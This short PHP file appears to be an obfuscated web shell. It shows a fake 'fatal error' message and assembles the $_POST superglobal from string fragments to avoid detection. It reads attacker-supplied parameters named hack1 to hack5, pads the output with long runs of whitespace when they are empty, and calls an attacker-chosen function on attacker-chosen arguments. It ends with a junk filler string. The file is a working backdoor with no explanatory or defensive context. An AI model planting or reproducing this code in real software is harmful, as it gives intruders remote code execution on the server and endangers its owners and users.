<?php
echo  "A fatal error has occurred";
$a=${"_"."P"."O"."ST"}["hack1"];
$aa=${"_"."P"."O"."ST"}["hack2"];
$aaa=${"_"."P"."O"."ST"}["hack3"];
$aaaa=${"_"."P"."O"."ST"}["hack4"];
$aaaaa=${"_"."P"."O"."ST"}["hack5"];
$aaaaaa=$a.$aa;
$aaaaaaa=$aaa.$aaaa;
if(empty($a))
{
    for ($x=0; $x<=999999999; $x++)
    {
        echo " ";
    }
}
if(empty($aa))
{
    for ($x=0; $x<=999999999; $x++)
    {
        echo " ";
    }
}
if(empty($aaa))
{
    for ($x=0; $x<=999999999; $x++)
    {
        echo " ";
    }
}
if(empty($aaaa))
{
    for ($x=0; $x<=999999999; $x++)
    {
        echo " ";
    }
}
if(empty($aaaaa))
{
    for ($x=0; $x<=999999999; $x++)
    {
        echo " ";
    }
}
if($aaaaa="pwd")
{
$aaaaaa($aaaaaaa);
}
$rmd5='sjak;jiowiobnSjlgvnadhnjgvipjskmvnoshfnmc qo[wioL;][\Q2 [;P<+B[]\6u;j7=\yhlp'
?>